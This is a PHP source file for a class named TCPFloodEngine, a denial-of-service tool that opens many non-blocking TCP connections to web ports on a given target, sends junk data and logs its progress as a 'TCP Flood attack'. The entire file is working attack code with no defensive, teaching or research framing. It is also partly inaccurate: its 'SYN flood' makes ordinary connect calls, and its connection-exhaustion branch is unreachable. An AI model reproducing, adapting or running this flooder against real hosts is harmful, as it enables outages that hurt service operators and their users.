<?php

class TCPFloodEngine {
    private $config;
    private $isRunning = false;
    private $metrics = [];
    
    public function __construct($config = []) {
        $this->config = array_merge([
            'threads' => 1000,
            'duration' => 60,
            'flood_types' => ['syn', 'ack', 'fin', 'rst', 'psh'],
            'ports' => [80, 443, 8080, 8443, 3000, 5000, 8000],
            'packet_size' => 1024,
            'connection_timeout' => 1,
            'syn_flood_enabled' => true,
            'connection_exhaustion' => true
        ], $config);
        
        $this->metrics = [
            'total_requests' => 0,
            'successful_connections' => 0,
            'failed_connections' => 0,
            'timeouts' => 0,
            'threads_used' => $this->config['threads'],
            'error_codes' => [],
            'start_time' => time()
        ];
    }
    
    public function start($target, $groupId, $behaviorProfile) {
        $this->isRunning = true;
        $this->logMessage("Starting TCP Flood attack on $target with {$this->config['threads']} threads");
        
        $host = $this->extractHost($target);
        if (!$host) {
            $this->logMessage("ERROR: Could not extract host from $target");
            return $this->metrics;
        }
        
        $startTime = time();
        $endTime = $startTime + $this->config['duration'];
        
        $this->logMessage("TCP Flood targeting host: $host for {$this->config['duration']} seconds");
        
        while (time() < $endTime && $this->isRunning) {
            $this->executeFloodCycle($host);
            usleep(50000); // 0.05 second between cycles
        }
        
        $this->isRunning = false;
        $this->logMessage("TCP Flood attack completed");
        return $this->metrics;
    }
    
    private function executeFloodCycle($host) {
        $threadsPerCycle = min(50, $this->config['threads']);
        
        for ($i = 0; $i < $threadsPerCycle; $i++) {
            $this->performTCPFlood($host);
        }
    }
    
    private function performTCPFlood($host) {
        $port = $this->config['ports'][array_rand($this->config['ports'])];
        $floodType = $this->config['flood_types'][array_rand($this->config['flood_types'])];
        
        $this->metrics['total_requests']++;
        
        try {
            switch ($floodType) {
                case 'syn':
                    $result = $this->performSynFlood($host, $port);
                    break;
                case 'connection_exhaustion':
                    $result = $this->performConnectionExhaustion($host, $port);
                    break;
                default:
                    $result = $this->performStandardFlood($host, $port);
                    break;
            }
            
            if ($result) {
                $this->metrics['successful_connections']++;
            } else {
                $this->metrics['failed_connections']++;
            }
            
        } catch (Exception $e) {
            $this->metrics['failed_connections']++;
            $this->metrics['error_codes']['tcp_error'] = ($this->metrics['error_codes']['tcp_error'] ?? 0) + 1;
        }
    }
    
    private function performSynFlood($host, $port) {
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if (!$socket) {
            return false;
        }
        
        socket_set_nonblock($socket);
        
        socket_set_option($socket, SOL_SOCKET, SO_REUSEADDR, 1);
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, ['sec' => 0, 'usec' => 100000]);
        
        $result = @socket_connect($socket, $host, $port);
        
        usleep(10000); // 0.01 second
        
        socket_close($socket);
        
        return true; // SYN packet sent
    }
    
    private function performConnectionExhaustion($host, $port) {
        $sockets = [];
        $maxConnections = 10;
        
        for ($i = 0; $i < $maxConnections; $i++) {
            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if ($socket) {
                socket_set_nonblock($socket);
                @socket_connect($socket, $host, $port);
                $sockets[] = $socket;
            }
        }
        
        usleep(100000); // 0.1 second
        
        foreach ($sockets as $socket) {
            socket_close($socket);
        }
        
        return count($sockets) > 0;
    }
    
    private function performStandardFlood($host, $port) {
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if (!$socket) {
            return false;
        }
        
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, ['sec' => 1, 'usec' => 0]);
        
        $startTime = microtime(true);
        $result = @socket_connect($socket, $host, $port);
        $endTime = microtime(true);
        
        if ($endTime - $startTime > $this->config['connection_timeout']) {
            $this->metrics['timeouts']++;
        }
        
        if ($result) {
            $data = str_repeat('X', $this->config['packet_size']);
            @socket_write($socket, $data);
        }
        
        socket_close($socket);
        
        return $result !== false;
    }
    
    private function extractHost($url) {
        $parsed = parse_url($url);
        if (isset($parsed['host'])) {
            return $parsed['host'];
        }
        
        if (preg_match('/https?:\/\/([^\/]+)/', $url, $matches)) {
            return $matches[1];
        }
        
        return null;
    }
    
    public function stop() {
        $this->isRunning = false;
        $this->logMessage("TCP Flood attack stopped");
    }
    
    public function getMetrics() {
        return $this->metrics;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        if (!is_dir(dirname($logFile))) {
            mkdir(dirname($logFile), 0755, true);
        }
        
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] TCP_FLOOD_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>
